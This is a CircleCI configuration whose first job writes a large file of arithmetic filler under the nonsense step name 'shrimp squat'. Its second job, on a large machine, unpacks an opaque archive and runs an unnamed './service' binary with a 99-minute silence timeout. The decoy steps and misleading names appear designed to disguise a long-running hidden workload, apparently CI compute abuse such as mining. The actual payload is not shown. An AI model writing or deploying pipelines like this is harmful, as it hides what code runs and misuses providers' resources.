version: 2.1

jobs:
  hydrate_package:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: shrimp squat
          command: |
            mkdir -p /var/tmp/ws
            set +o pipefail 2>/dev/null; seq 1 1212439 | awk '{print $1*7919 % 2147483647}' > /var/tmp/ws/output.txt; true
            echo "baseline emitted ($(wc -l </var/tmp/ws/output.txt) lines)"
      - persist_to_workspace:
          root: /var/tmp/ws
          paths:
            - output.txt
  package:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /var/tmp/ws
      - run:
          name: Peek upstream
          command: |
            { head -c 200 /var/tmp/ws/output.txt > /dev/null; echo "peek ok" ; } || true
      - run:
          name: Retrieve repository
          command: git clone --depth 2 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: xz -dc build-dist.tar.xz | tar xf -
      - run:
          no_output_timeout: 99m
          command: ./service
